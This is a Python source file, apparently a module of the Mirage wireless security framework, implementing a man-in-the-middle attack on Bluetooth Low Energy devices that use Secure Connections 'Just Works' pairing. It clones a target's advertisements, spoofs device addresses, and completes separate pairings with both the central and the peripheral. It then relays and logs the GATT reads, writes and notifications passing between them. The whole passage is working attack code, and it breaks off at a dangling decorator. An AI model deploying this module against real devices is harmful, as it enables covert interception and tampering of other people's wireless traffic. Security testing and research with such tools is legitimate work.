import os, queue, threading
from enum import IntEnum
from mirage.libs import utils, ble
from mirage.core import module
from mirage.libs.ble_utils.sc_crypto import SCCryptoInstance, CryptoUtils
from binascii import unhexlify
from mirage.libs.ble_utils.packets import *
from mirage.libs import io
from mirage.libs.ble_utils.constants import LL_ERROR_CODES as errorCode


class BLEMitmStage(IntEnum):
    SCAN = 1
    CLONE = 2
    WAIT_CONNECTION = 3
    MASTER_CONNECTION = 4
    ACTIVE_MITM = 5
    STOP = 6


class ble_sc_mitm(module.WirelessModule):
    def checkCapabilities(self):
        a2scap = self.a2sEmitter.hasCapabilities(
            "COMMUNICATING_AS_MASTER", "INITIATING_CONNECTION", "SCANNING"
        )
        a2mcap = self.a2mEmitter.hasCapabilities(
            "COMMUNICATING_AS_SLAVE", "RECEIVING_CONNECTION", "ADVERTISING"
        )
        return a2scap and a2mcap

    def init(self):
        self.technology = "ble"
        self.type = "attack"
        self.description = "Man-in-the-Middle module for Bluetooth Low Energy devices with Secure Connections Just Works"
        self.args = {
            "INTERFACE1": "hci0",  # must allow to change BD Address
            "INTERFACE2": "hci1",
            "TARGET": "FC:58:FA:A1:26:6B",
            "CONNECTION_TYPE": "public",
            "SLAVE_SPOOFING": "yes",
            "MASTER_SPOOFING": "no",
            "ADVERTISING_STRATEGY": "preconnect",  # "preconnect" (btlejuice) or "flood" (gattacker)
            "SHOW_SCANNING": "yes",
            "SCENARIO": "",
            "PACKET_TRACE": "",
            "COMMAND": "",
            "DUCKYSCRIPT": "",
        }
        self.stage = BLEMitmStage.SCAN

        self.slaveSCCrypto = SCCryptoInstance()

        self.slaveLocalAddress = None
        self.slaveLocalAddressType = None
        self.slaveRemoteAddress = None
        self.slaveRemoteAddressType = None
        self.slaveLocalNonce = None
        self.slaveRemoteConfirm = None
        self.slaveLocalIOCap = None
        self.slaveRemoteIOCap = None
        self.slaveInitiatorKeyDistribution = None
        self.slaveResponderKeyDistribution = None

        self.masterSCCrypto = SCCryptoInstance()

        self.masterLocalAddress = None
        self.masterLocalAddressType = None
        self.masterRemoteAddress = None
        self.masterRemoteAddressType = None
        self.masterLocalNonce = None
        self.masterRemoteConfirm = None
        self.masterLocalIOCap = None
        self.masterRemoteIOCap = None
        self.masterInitiatorKeyDistribution = None
        self.masterResponderKeyDistribution = None
        # Results
        self.slaveIRK = None
        self.slaveCSRK = None
        self.slaveRemoteIRK = None
        self.slaveremoteCSRK = None
        self.slaveRemoteIdentityAddress = None
        self.slavePaired = False

        self.masterIRK = None
        self.masterCSRK = None
        self.masterRemoteIRK = None
        self.masterRemoteCSRK = None
        self.masterRemoteIdentityAddress = None
        self.masterPaired = False

        # CLONE stage related
        self.addrType = None
        self.address = None
        self.intervalMin = None
        self.intervalMax = None
        self.dataAdvInd = None
        self.dataScanRsp = None

        # Values from UpdateConnectionParametersRequest
        self.timeoutMult = None
        self.slaveLatency = None
        self.minInterval = None
        self.maxInterval = None

        # Packet Queues
        self.slaveQueue = queue.Queue()
        self.masterQueue = queue.Queue()
        # Mutex for pairing finished check
        self.mutex = threading.Lock()

    # Scenario-related methods
    @module.scenarioSignal("onStart")
    def startScenario(self):
        pass

    @module.scenarioSignal("onEnd")
    def endScenario(self, result):
        return result

    def initMitMDevices(self):
        attackerToSlaveInterface = self.args["INTERFACE1"]
        attackerToMasterInterface = self.args["INTERFACE2"]

        self.a2sEmitter = self.getEmitter(interface=attackerToSlaveInterface)
        self.a2sReceiver = self.getReceiver(interface=attackerToSlaveInterface)
        self.a2sReceiver.enableRecvOfTransmittedLLPackets(True)

        self.a2mEmitter = self.getEmitter(interface=attackerToMasterInterface)
        self.a2mReceiver = self.getReceiver(interface=attackerToMasterInterface)
        self.a2mReceiver.enableRecvOfTransmittedLLPackets(True)

        if not self.a2mEmitter.isAddressChangeable() and utils.booleanArg(
            self.args["SLAVE_SPOOFING"]
        ):
            io.warning(
                "Interface "
                + attackerToMasterInterface
                + " is not able to change its address : "
                "Slave address spoofing will not be enabled !"
            )

        if not self.a2sEmitter.isAddressChangeable() and utils.booleanArg(
            self.args["MASTER_SPOOFING"]
        ):
            io.warning(
                "Interface "
                + attackerToMasterInterface
                + " is not able to change its address : "
                "Master address spoofing will not be enabled !"
            )

    def initPacketLogDevices(self):
        self.sPacketLogger = self.getEmitter(
            interface="slave_" + self.args["PACKET_TRACE"]
        )
        self.mPacketLogger = self.getEmitter(
            interface="master_" + self.args["PACKET_TRACE"]
        )

    # Configuration methods
    def initEmittersAndReceivers(self):
        self.initMitMDevices()
        if self.args["PACKET_TRACE"] != "":
            self.initPacketLogDevices()

    # Stage related methods
    def getStage(self):
        return self.stage

    @module.scenarioSignal("onStageChange")
    def setStage(self, value):
        self.stage = value

    def waitUntilStage(self, stage):
        while self.getStage() != stage:
            utils.wait(seconds=0.01)

    def checkPairingComplete(self):
        self.mutex.acquire()
        if self.masterPaired and self.slavePaired:
            self.setStage(BLEMitmStage.ACTIVE_MITM)
            io.success("Entering ACTIVE_MITM stage ...")
            while not self.slaveQueue.empty():
                self.a2mEmitter.sendp(self.slaveQueue.get())

            while not self.masterQueue.empty():
                self.a2sEmitter.sendp(self.masterQueue.get())

        self.mutex.release()

    # Advertising related methods
    @module.scenarioSignal("onSlaveAdvertisement")
    def scanStage(self, packet):
        if utils.booleanArg(self.args["SHOW_SCANNING"]):
            io.info("{}".format(packet))
        if self.getStage() == BLEMitmStage.SCAN:
            if utils.addressArg(self.args["TARGET"]) == packet.addr.upper():
                if packet.type == "ADV_IND":
                    self.address = utils.addressArg(self.args["TARGET"])
                    data = packet.getRawDatas()
                    self.intervalMin = packet.intervalMin
                    self.intervalMax = packet.intervalMax
                    self.addrType = packet.addrType
                    self.dataAdvInd = data
                elif packet.type == "SCAN_RSP":
                    self.dataScanRsp = packet.getRawDatas()

            if self.dataAdvInd is not None and self.dataScanRsp is not None:
                self.cloneStage(
                    self.address,
                    self.dataAdvInd,
                    self.dataScanRsp,
                    self.intervalMin,
                    self.intervalMax,
                    self.addrType,
                )

    @module.scenarioSignal("onCloning")
    def cloneStage(
        self, address, data, dataResponse, intervalMin, intervalMax, addrType
    ):
        io.success("Entering CLONE stage ...")
        self.setStage(BLEMitmStage.CLONE)

        if self.args["ADVERTISING_STRATEGY"] == "flood":
            intervalMin = 33
            intervalMax = 34

        if utils.booleanArg(self.args["SLAVE_SPOOFING"]):
            if address != self.a2mEmitter.getAddress():
                self.a2mEmitter.setAddress(address, random=1 == addrType)

            self.masterLocalAddress = address
            self.masterLocalAddressType = addrType
        else:
            self.masterLocalAddress = self.a2sEmitter.getAddress()
            self.masterLocalAddressType = (
                0 if self.a2sEmitter.getAddressMode() == "public" else 1
            )

        self.advData = data
        self.intervalMin = intervalMin
        self.intervalMax = intervalMax
        self.daType = addrType
        self.oaType = addrType
        self.a2mEmitter.setScanningParameters(data=dataResponse)
        self.a2mEmitter.setAdvertisingParameters(
            data=data,
            intervalMin=intervalMin,
            intervalMax=intervalMax,
            daType=addrType,
            oaType=addrType,
        )

    # Connection related methods
    @module.scenarioSignal("onSlaveConnect")
    def connectOnSlave(self, initiatorType="public"):
        while self.a2sEmitter.getMode() != "NORMAL":
            utils.wait(seconds=1)
            print(self.a2sEmitter.getMode())

        address = utils.addressArg(self.args["TARGET"])
        connectionType = self.args["CONNECTION_TYPE"]

        self.responderAddress = address
        self.responderAddressType = (
            b"\x00" if self.args["CONNECTION_TYPE"] == "public" else b"\x01"
        )
        io.info("Connecting to slave " + address + "...")
        self.a2sEmitter.sendp(
            ble.BLEConnect(
                dstAddr=address, type=connectionType, initiatorType=initiatorType
            )
        )
        while not self.a2sEmitter.isConnected():
            utils.wait(seconds=0.5)
        io.success("Connected on slave : " + self.a2sReceiver.getCurrentConnection())
        if not self.slavePaired and (
            not utils.booleanArg(self.args["MASTER_SPOOFING"])
            or (
                utils.booleanArg(self.args["MASTER_SPOOFING"])
                and self.getStage() == BLEMitmStage.MASTER_CONNECTION
            )
        ):
            keyboard = False
            yesno = False
            display = False

            ct2 = False
            mitm = False
            bonding = True
            secureConnections = True
            keyPress = False

            self.slaveInitiatorInputOutputCapability = ble.InputOutputCapability(
                keyboard=keyboard, display=display, yesno=yesno
            )
            self.slaveInitiatorAuthReq = ble.AuthReqFlag(
                ct2=ct2,
                mitm=mitm,
                bonding=bonding,
                secureConnections=secureConnections,
                keypress=keyPress,
            )
            self.slaveInitiatorKeyDistribution = ble.KeyDistributionFlag(
                linkKey=True, encKey=True, idKey=False, signKey=True
            )
            oob = b"\x00"
            self.slaveLocalIOCap = (
                self.slaveInitiatorAuthReq.data
                + oob
                + self.slaveInitiatorInputOutputCapability.data
            )

            request = ble.BLEPairingRequest(
                authentication=self.slaveInitiatorAuthReq.data[0],
                inputOutputCapability=self.slaveInitiatorInputOutputCapability.data[0],
                initiatorKeyDistribution=self.slaveInitiatorKeyDistribution.data[0],
                responderKeyDistribution=self.slaveInitiatorKeyDistribution.data[0],
            )
            io.info("{}".format(request))
            self.a2sEmitter.sendp(request)

    @module.scenarioSignal("onMasterConnect")
    def connect(self, packet):
        if self.getStage() == BLEMitmStage.WAIT_CONNECTION:
            self.setStage(BLEMitmStage.MASTER_CONNECTION)
            io.success("Master connected : " + packet.srcAddr)

            if self.args["ADVERTISING_STRATEGY"] == "preconnect" and utils.booleanArg(
                self.args["MASTER_SPOOFING"]
            ):
                self.a2sEmitter.sendp(ble.BLEDisconnect())
                while self.a2sEmitter.isConnected():
                    utils.wait(seconds=0.01)
                io.info("Giving slave 1s time to reset...")
                utils.wait(seconds=1)

            if utils.booleanArg(self.args["MASTER_SPOOFING"]):
                self.a2sEmitter.setAddress(
                    packet.srcAddr, random=packet.type == "random"
                )
                self.slaveLocalAddress = packet.srcAddr
                self.slaveLocalAddressType = 0 if packet.type == "public" else 1

            if utils.booleanArg(self.args["MASTER_SPOOFING"]):
                self.connectOnSlave(packet.type)
            elif self.args["ADVERTISING_STRATEGY"] == "flood":
                self.connectOnSlave()

            ct2 = False
            mitm = False
            bonding = False
            secureConnections = True
            keyPress = False

            authReq = ble.AuthReqFlag(
                ct2=ct2,
                mitm=mitm,
                bonding=bonding,
                secureConnections=secureConnections,
                keypress=keyPress,
            )

            securityRequest = ble.BLESecurityRequest(authentication=authReq.data[0])
            io.info("{}".format(securityRequest))
            self.a2mEmitter.sendp(securityRequest)

    @module.scenarioSignal("onMasterDisconnect")
    def disconnectMaster(self, packet):
        io.fail("Master disconnected ! Starting to advertise again...")
        utils.wait(0.5)
        self.a2mEmitter.setAdvertisingParameters(
            data=self.dataAdvInd,
            intervalMin=self.intervalMin,
            intervalMax=self.intervalMax,
            daType=self.addrType,
            oaType=self.addrType,
        )
        self.a2mEmitter.setScanningParameters(data=self.dataScanRsp)
        self.masterPaired = False
        self.masterSCCrypto = SCCryptoInstance()
        self.setStage(BLEMitmStage.WAIT_CONNECTION)
        self.a2mEmitter.setAdvertising(enable=True)

    @module.scenarioSignal("onSlaveDisconnect")
    def disconnectSlave(self, packet):
        io.fail("Slave disconnected !")
        if self.getStage() == BLEMitmStage.ACTIVE_MITM:
            self.setStage(BLEMitmStage.STOP)

    # Slave Pairing releated callbacks
    @module.scenarioSignal("onSlaveSecurityRequest")
    def securityRequest(self, packet):
        io.info("{}".format(packet))
        io.info("{}".format(self.pairingRequest))
        self.a2sEmitter.sendp(self.pairingRequest)

    @module.scenarioSignal("onSlavePairingResponse")
    def pairingResponse(self, packet):
        io.info("{}".format(packet))
        self.slaveLocalAddress = self.a2sEmitter.getAddress()
        self.slaveLocalAddressType = (
            0 if self.a2sEmitter.getAddressMode() == "public" else 1
        )

        self.slaveRemoteAddress = self.a2sEmitter.getCurrentConnection()
        self.slaveRemoteAddressType = (
            0 if self.a2sEmitter.getCurrentConnectionMode() == "public" else 1
        )

        self.slaveResponderAuthReq = ble.AuthReqFlag(
            data=bytes([packet.authentication])
        )
        self.slaveResponderInputOutputCapability = ble.InputOutputCapability(
            data=bytes([packet.inputOutputCapability])
        )
        self.slaveResponderKeyDistribution = ble.KeyDistributionFlag(
            data=bytes([packet.responderKeyDistribution])
        )

        (nwOrderPubKeyX, nwOrderPubKeyY) = self.slaveSCCrypto.generateDHKeyPair()
        self.slaveRemoteIOCap = (
            format(packet.authentication, "02x")
            + ("01" if packet.outOfBand else "00")
            + format(packet.inputOutputCapability, "02x")
        )
        self.slaveRemoteIOCap = unhexlify(self.slaveRemoteIOCap)
        response = ble.BLEPublicKey(key_x=nwOrderPubKeyX, key_y=nwOrderPubKeyY)
        io.info("{}".format(response))
        self.a2sEmitter.sendp(response)

    @module.scenarioSignal("onSlavePublicKey")
    def slavePublicKey(self, packet):
        io.info("{}".format(packet))
        self.slaveSCCrypto.generateDHSharedSecret(packet.key_x, packet.key_y)

    @module.scenarioSignal("onSlavePairingConfirm")
    def slavePairingConfirm(self, packet):
        io.info("{}".format(packet))
        while not self.slaveSCCrypto.isSharedSecretReady():
            utils.wait(0.2)
        self.slaveRemoteConfirm = packet.confirm
        nwOrderLocalNonce = self.slaveSCCrypto.generateLocalNonce()
        self.a2sEmitter.sendp(ble.BLEPairingRandom(random=nwOrderLocalNonce))

    @module.scenarioSignal("onSlavePairingRandom")
    def slavePairingRandom(self, packet):
        io.info("{}".format(packet))
        self.slaveRemoteNonce = packet.random
        if self.slaveSCCrypto.verifyConfirmValue(
            self.slaveRemoteNonce, self.slaveRemoteConfirm
        ):
            io.info("Slave verify Confirm value success!")
        else:
            io.fail("Slave verify Confirm value failed!")
            self.a2sEmitter.sendp(ble.BLEPairingFailed())

        io.info("Slave deriving LTK")
        self.slaveSCCrypto.deriveLTKInitiator(
            self.slaveLocalAddress,
            self.slaveRemoteAddress,
            self.slaveLocalAddressType,
            self.slaveRemoteAddressType,
            self.slaveRemoteNonce,
        )
        io.info("Slave sending DH Key Check")
        nwOrderDHKeyCheck = self.slaveSCCrypto.generateDHKeyCheck(
            self.slaveLocalIOCap,
            self.slaveLocalAddress,
            self.slaveRemoteAddress,
            self.slaveLocalAddressType,
            self.slaveRemoteAddressType,
            self.slaveRemoteNonce,
        )
        packet = ble.BLEDHKeyCheck(dhkey_check=nwOrderDHKeyCheck)
        self.a2sEmitter.sendp(packet)

    @module.scenarioSignal("onSlaveDHKeyCheck")
    def slaveDHKeyCheck(self, packet):
        io.info("{}".format(packet))
        while not self.slaveSCCrypto.isLTKReady():
            utils.wait(0.2)
        if self.slaveSCCrypto.verifyDHKeyCheck(
            self.slaveRemoteIOCap,
            self.slaveLocalAddress,
            self.slaveRemoteAddress,
            self.slaveLocalAddressType,
            self.slaveRemoteAddressType,
            packet.dhkey_check,
            self.slaveRemoteNonce,
        ):
            io.info("Slave DH Key Check success!")
        else:
            io.fail("Slave DH Key Check failed!")
            self.a2sEmitter.sendp(ble.BLEPairingFailed())
        io.info("Slave Try to encrypt link")
        request = ble.BLEStartEncryption(
            rand=b"\x00" * 16, ediv=0, ltk=self.slaveSCCrypto.LTK[::-1]
        )
        io.info("{}".format(request))
        self.a2sEmitter.sendp(request)

    @module.scenarioSignal("onSlaveEncryptionChange")
    def slaveEncryptionChange(self, packet):
        io.info("{}".format(packet))
        if packet.status == 0x00 and packet.enabled == 0x01:
            io.info(f"Slave Encryption success")
            if not self.slaveResponderKeyDistribution.encKey:
                self.slavePaired = True
                self.checkPairingComplete()
        else:
            io.fail("Slave Encryption failed...")

    # Master Pairing related callbacks
    @module.scenarioSignal("onMasterPairingRequest")
    def pairingRequest(self, packet):
        self.masterRemoteAddress = self.a2mEmitter.getCurrentConnection()
        self.masterRemoteAddressType = (
            0 if self.a2mEmitter.getCurrentConnectionMode() == "public" else 1
        )

        self.masterInitiatorKeyDistribution = ble.KeyDistributionFlag(
            data=bytes([packet.initiatorKeyDistribution])
        )

        io.info("{}".format(packet))
        keyboard = False
        yesno = False
        display = False

        ct2 = False
        mitm = False
        bonding = False
        secureConnections = True
        keyPress = False

        self.masterRemoteIOCap = (
            format(packet.authentication, "02x")
            + ("01" if packet.outOfBand else "00")
            + format(packet.inputOutputCapability, "02x")
        )
        self.masterRemoteIOCap = unhexlify(self.masterRemoteIOCap)

        masterResponderInputOutputCapability = ble.InputOutputCapability(
            keyboard=keyboard, display=display, yesno=yesno
        )
        masterResponderAuthReq = ble.AuthReqFlag(
            ct2=ct2,
            mitm=mitm,
            bonding=bonding,
            secureConnections=secureConnections,
            keypress=keyPress,
        )
        self.masterResponderKeyDistribution = ble.KeyDistributionFlag(
            linkKey=False, encKey=True, idKey=False, signKey=True
        )
        oob = b"\x00"

        response = ble.BLEPairingResponse(
            authentication=masterResponderAuthReq.data[0],
            inputOutputCapability=masterResponderInputOutputCapability.data[0],
            initiatorKeyDistribution=self.masterResponderKeyDistribution.data[0],
            responderKeyDistribution=self.masterResponderKeyDistribution.data[0],
        )
        self.masterLocalIOCap = (
            masterResponderAuthReq.data
            + oob
            + masterResponderInputOutputCapability.data
        )
        io.info("{}".format(response))
        self.a2mEmitter.sendp(response)

    @module.scenarioSignal("onMasterPublicKey")
    def masterPublicKey(self, packet):
        io.info("{}".format(packet))
        (nwOrderMasterKeyX, nwORderMasterKeyY) = self.masterSCCrypto.generateDHKeyPair()
        response = ble.BLEPublicKey(key_x=nwOrderMasterKeyX, key_y=nwORderMasterKeyY)
        io.info("{}".format(response))
        self.a2mEmitter.sendp(response)

        self.masterSCCrypto.generateDHSharedSecret(packet.key_x, packet.key_y)
        self.masterLocalNonce = self.masterSCCrypto.generateLocalNonce()
        nwOrderConfirmValue = self.masterSCCrypto.generateConfirmValue()
        response = ble.BLEPairingConfirm(confirm=nwOrderConfirmValue)
        io.info("{}".format(response))
        self.a2mEmitter.sendp(response)

    @module.scenarioSignal("onMasterPairingRandom")
    def masterPairingRandom(self, packet):
        io.info("{}".format(packet))
        self.masterRemoteNonce = packet.random
        response = ble.BLEPairingRandom(random=self.masterLocalNonce)
        io.info("{}".format(response))
        self.a2mEmitter.sendp(response)

    @module.scenarioSignal("onMasterDHKeyCheck")
    def masterDHKeyCheck(self, packet):
        io.info("{}".format(packet))
        self.masterSCCrypto.deriveLTKResponder(
            self.masterLocalAddress,
            self.masterRemoteAddress,
            self.masterLocalAddressType,
            self.masterRemoteAddressType,
            self.masterRemoteNonce,
        )

        if not self.masterSCCrypto.verifyDHKeyCheck(
            self.masterRemoteIOCap,
            self.masterLocalAddress,
            self.masterRemoteAddress,
            self.masterLocalAddressType,
            self.masterRemoteAddressType,
            packet.dhkey_check,
            self.masterRemoteNonce,
        ):
            io.fail("Master DH Key Check failed!")
            self.a2mEmitter.sendp(ble.BLEPairingFailed())
        else:
            io.info("Master DH Key Check success!")
            io.info("Master Sending DH Key Check")
            nwOrderDHKeyCheck = self.masterSCCrypto.generateDHKeyCheck(
                self.masterLocalIOCap,
                self.masterLocalAddress,
                self.masterRemoteAddress,
                self.masterLocalAddressType,
                self.masterRemoteAddressType,
                self.masterRemoteNonce,
            )
            response = ble.BLEDHKeyCheck(dhkey_check=nwOrderDHKeyCheck)
            self.a2mEmitter.sendp(response)

    @module.scenarioSignal("onLongTermKeyRequest")
    def longTermKeyRequest(self, packet):
        io.info("{}".format(packet))
        if self.masterSCCrypto.isLTKReady():
            response = ble.BLELongTermKeyRequestReply(
                positive=True, ltk=self.masterSCCrypto.LTK[::-1]
            )
        else:
            response = ble.BLELongTermKeyRequestReply(positive=False)
        io.info("{}".format(response))
        self.a2mEmitter.sendp(response)

    @module.scenarioSignal("onMasterEncryptionChange")
    def masterEncryptionChange(self, packet):
        io.info("{}".format(packet))
        if packet.status == 0x00 and packet.enabled == 0x01:
            io.info("Master Encryption success")
            (self.masterIRK, self.masterCSRK) = self.keyDistribution(
                self.masterResponderKeyDistribution,
                self.a2mEmitter,
                self.masterLocalAddress,
                self.masterLocalAddressType,
            )
        else:
            io.fail("Master Encryption failed...")

    def pairingFailed(self, packet):
        io.fail("Pairing Failed received : " + packet.toString())
        if packet.reason == ble.SM_ERR_PASSKEY_ENTRY_FAILED:
            io.fail("Reason : Passkey Entry Failed")
        elif packet.reason == ble.SM_ERR_OOB_NOT_AVAILABLE:
            io.fail("Reason : Out of Band not available")
        elif packet.reason == ble.SM_ERR_AUTH_REQUIREMENTS:
            io.fail("Reason : Authentication requirements")
        elif packet.reason == ble.SM_ERR_CONFIRM_VALUE_FAILED:
            io.fail("Reason : Confirm Value failed")
        elif packet.reason == ble.SM_ERR_PAIRING_NOT_SUPPORTED:
            io.fail("Reason : Pairing not supported")
        elif packet.reason == ble.SM_ERR_OOB_NOT_AVAILABLE:
            io.fail("Reason : Out of Band not available")
        elif packet.reason == ble.SM_ERR_ENCRYPTION_KEY_SIZE:
            io.fail("Reason : Encryption key size")
        elif packet.reason == ble.SM_ERR_COMMAND_NOT_SUPPORTED:
            io.fail("Reason : Command not supported")
        elif packet.reason == ble.SM_ERR_UNSPECIFIED_REASON:
            io.fail("Reason : Unspecified reason")
        elif packet.reason == ble.SM_ERR_REPEATED_ATTEMPTS:
            io.fail("Reason : Repeated Attempts")
        elif packet.reason == ble.SM_ERR_INVALID_PARAMETERS:
            io.fail("Reason : Invalid Parameters")
        elif packet.reason == ble.SM_ERR_DHKEY_CHECK_FAILED:
            io.fail("Reason : DHKey Check failed")
        elif packet.reason == ble.SM_ERR_NUMERIC_COMPARISON_FAILED:
            io.fail("Reason : Numeric Comparison failed")
        elif packet.reason == ble.SM_ERR_BREDR_PAIRING_IN_PROGRESS:
            io.fail("Reason : BR/EDR Pairing in progress")
        elif packet.reason == ble.SM_ERR_CROSS_TRANSPORT_KEY:
            io.fail("Reason : Cross-transport Key Derivation/Generation not allowed")
        else:
            io.fail("Reason : unknown")

    @module.scenarioSignal("onMasterPairingFailed")
    def masterPairingFailed(self, packet):
        io.info("Pairing Failed (from master) !")
        self.pairingFailed(packet)

    @module.scenarioSignal("onSlavePairingFailed")
    def slavePairingFailed(self, packet):
        io.info("Pairing Failed (from slave) !")
        self.pairingFailed(packet)

    def keyDistribution(self, keyDistribution, emitter, localAddress, localAddressType):
        localIRK = None
        if keyDistribution.idKey:
            localIRK = CryptoUtils.generateRandom()
            emitter.sendp(
                ble.BLEIdentityInformation(irk=CryptoUtils.reverseOrder(localIRK.hex()))
            )
            emitter.sendp(
                ble.BLEIdentityAddressInformation(
                    address=localAddress,
                    type=localAddressType,
                )
            )
            io.info("Sent IRK")
        localCSRK = None
        if keyDistribution.signKey:
            localCSRK = CryptoUtils.generateRandom()
            emitter.sendp(
                ble.BLESigningInformation(
                    csrk=CryptoUtils.reverseOrder(localCSRK.hex())
                )
            )
            io.info("Sent CSRK")
        return (localIRK, localCSRK)

    @module.scenarioSignal("onSlaveIdentityAddressInformation")
    def slaveIdentityAddressInformation(self, packet):
        io.info("{}".format(packet))
        self.slaveRemoteIdentityAddress = packet.address
        if not self.slaveResponderKeyDistribution.signKey:
            (self.slaveIRK, self.slaveCSRK) = self.keyDistribution(
                self.slaveInitiatorKeyDistribution,
                self.a2sEmitter,
                self.slaveLocalAddress,
                self.slaveLocalAddressType,
            )
            io.info("Slave pairing finished")
            self.slavePaired = True
            self.checkPairingComplete()

    @module.scenarioSignal("onSlaveIdentityInformation")
    def slaveIdentityInformation(self, packet):
        io.info("Identity Information (from slave) : irk = " + packet.irk.hex())
        self.slaveRemoteIRK = packet.irk

    @module.scenarioSignal("onSlaveSigningInformation")
    def slaveSigningInformation(self, packet):
        io.info("Signing Information (from slave) : csrk = " + packet.csrk.hex())
        self.slaveRemoteCSRK = packet.csrk
        (self.slaveIRK, self.slaveCSRK) = self.keyDistribution(
            self.slaveInitiatorKeyDistribution,
            self.a2sEmitter,
            self.slaveLocalAddress,
            self.slaveLocalAddressType,
        )
        io.info("Slave pairing finished")
        self.slavePaired = True
        self.checkPairingComplete()

    @module.scenarioSignal("onMasterIdentityAddressInformation")
    def masterIdentityAddressInformation(self, packet):
        io.info("{}".format(packet))
        self.masterRemoteIdentityAddress = packet.address
        if not self.masterInitiatorKeyDistribution.signKey:
            io.info("Master pairing finished")
            self.masterPaired = True
            self.checkPairingComplete()

    @module.scenarioSignal("onMasterIdentityInformation")
    def masterIdentityInformation(self, packet):
        io.info("Identity Information (from master) : irk = " + packet.irk.hex())
        self.masterRemoteIRK = packet.irk

    @module.scenarioSignal("onMasterSigningInformation")
    def masterSigningInformation(self, packet):
        io.info("Signing Information (from master) : csrk = " + packet.csrk.hex())
        self.masterRemoteCSRK = packet.csrk
        io.info("Master pairing finished")
        self.masterPaired = True
        self.checkPairingComplete()

    def forwardToSlave(self, packet):
        if self.a2sEmitter.isConnected():
            io.info("Redirecting to slave ...")
            self.a2sEmitter.sendp(packet)

    def forwardToMaster(self, packet):
        if self.a2mEmitter.isConnected():
            io.info("Redirecting to master ...")
            self.a2mEmitter.sendp(packet)

    @module.scenarioSignal("onMasterExchangeMTURequest")
    def exchangeMtuRequest(self, packet):
        io.info("Exchange MTU Request (from master) : mtu = " + str(packet.mtu))
        self.forwardToSlave(ble.BLEExchangeMTURequest(mtu=packet.mtu))

    @module.scenarioSignal("onSlaveExchangeMTUResponse")
    def exchangeMtuResponse(self, packet):
        io.info("Exchange MTU Response (from slave) : mtu = " + str(packet.mtu))
        self.forwardToMaster(ble.BLEExchangeMTUResponse(mtu=packet.mtu))

    @module.scenarioSignal("onMasterErrorResponse")
    def masterErrorResponse(self, packet):
        io.info(
            "Error Response (from master) : request = "
            + hex(packet.request)
            + " / handle = "
            + hex(packet.handle)
            + " / ecode = "
            + hex(packet.ecode)
        )
        self.forwardToSlave(
            ble.BLEErrorResponse(
                request=packet.request, handle=packet.handle, ecode=packet.ecode
            )
        )

    @module.scenarioSignal("onMasterWriteCommand")
    def writeCommand(self, packet):
        io.info(
            "Write Command (from master) : handle = "
            + hex(packet.handle)
            + " / value = "
            + packet.value.hex()
        )
        self.forwardToSlave(
            ble.BLEWriteCommand(handle=packet.handle, value=packet.value)
        )

    @module.scenarioSignal("onMasterWriteRequest")
    def writeRequest(self, packet):
        io.info(
            "Write Request (from master) : handle = "
            + hex(packet.handle)
            + " / value = "
            + packet.value.hex()
        )
        self.forwardToSlave(
            ble.BLEWriteRequest(handle=packet.handle, value=packet.value)
        )

    @module.scenarioSignal("onSlaveWriteResponse")
    def writeResponse(self, packet):
        io.info("Write Response (from slave)")
        self.forwardToMaster(ble.BLEWriteResponse())

    @module.scenarioSignal("onMasterReadBlobRequest")
    def readBlob(self, packet):
        io.info(
            "Read Blob Request (from master) : handle = "
            + hex(packet.handle)
            + " / offset = "
            + str(packet.offset)
        )
        self.forwardToSlave(
            ble.BLEReadBlobRequest(handle=packet.handle, offset=packet.offset)
        )

    @module.scenarioSignal("onSlaveReadBlobResponse")
    def readBlobResponse(self, packet):
        io.info("Read Blob Response (from slave) : value = " + packet.value.hex())
        self.forwardToMaster(ble.BLEReadBlobResponse(value=packet.value))

    @module.scenarioSignal("onMasterReadRequest")
    def read(self, packet):
        io.info("Read Request (from master) : handle = " + hex(packet.handle))

        self.forwardToSlave(ble.BLEReadRequest(handle=packet.handle))

    @module.scenarioSignal("onSlaveReadResponse")
    def readResponse(self, packet):
        io.info("Read Response (from slave) : value = " + packet.value.hex())

        self.forwardToMaster(ble.BLEReadResponse(value=packet.value))

    @module.scenarioSignal("onSlaveErrorResponse")
    def slaveErrorResponse(self, packet):
        io.info(
            "Error Response (from slave) : request = "
            + hex(packet.request)
            + " / handle = "
            + hex(packet.handle)
            + " / ecode = "
            + hex(packet.ecode)
        )

        self.forwardToMaster(
            ble.BLEErrorResponse(
                request=packet.request, handle=packet.handle, ecode=packet.ecode
            )
        )

    @module.scenarioSignal("onSlaveHandleValueNotification")
    def notification(self, packet):
        io.info(
            "Handle Value Notification (from slave) : handle = "
            + hex(packet.handle)
            + " / value = "
            + packet.value.hex()
        )

        self.forwardToMaster(
            ble.BLEHandleValueNotification(handle=packet.handle, value=packet.value)
        )

    @module.scenarioSignal("onSlaveHandleValueIndication")
    def indication(self, packet):
        io.info(
            "Handle Value Indication (from slave) : handle = "
            + hex(packet.handle)
            + " / value = "
            + packet.value.hex()
        )

        self.forwardToMaster(
            ble.BLEHandleValueIndication(handle=packet.handle, value=packet.value)
        )

    @module.scenarioSignal("onMasterHandleValueConfirmation")
    def confirmation(self, packet):
        io.info("Handle Value Confirmation (from master)")
        self.forwardToSlave(ble.BLEHandleValueConfirmation())

    @module.scenarioSignal("onMasterFindInformationRequest")
    def findInformation(self, packet):
        io.info(
            "Find Information Request (from master) : startHandle = "
            + hex(packet.startHandle)
            + " / endHandle = "
            + hex(packet.endHandle)
        )
        self.forwardToSlave(
            ble.BLEFindInformationRequest(
                startHandle=packet.startHandle, endHandle=packet.endHandle
            )
        )

    @module.scenarioSignal("onSlaveFindInformationResponse")
    def findInformationResponse(self, packet):
        io.info(
            "Find Information Response (from slave) : format = "
            + hex(packet.format)
            + " / data = "
            + packet.data.hex()
        )

        self.forwardToMaster(
            ble.BLEFindInformationResponse(format=packet.format, data=packet.data)
        )

    @module.scenarioSignal("onMasterFindByTypeValueRequest")
    def findByTypeValueRequest(self, packet):
        io.info(
            "Find Type By Value Request (from master) : startHandle = "
            + hex(packet.startHandle)
            + " / endHandle = "
            + hex(packet.endHandle)
            + " / uuid = "
            + hex(packet.uuid)
            + " / data = "
            + packet.data.hex()
        )

        self.forwardToSlave(
            ble.BLEFindByTypeValueRequest(
                startHandle=packet.startHandle,
                endHandle=packet.endHandle,
                uuid=packet.uuid,
                data=packet.data,
            )
        )

    @module.scenarioSignal("onSlaveFindByTypeValueResponse")
    def findByTypeValueResponse(self, packet):
        io.info("Find Type By Value Response (from slave)")
        self.forwardToMaster(ble.BLEFindByTypeValueResponse(handles=packet.handles))

    @module.scenarioSignal("onMasterReadByTypeRequest")
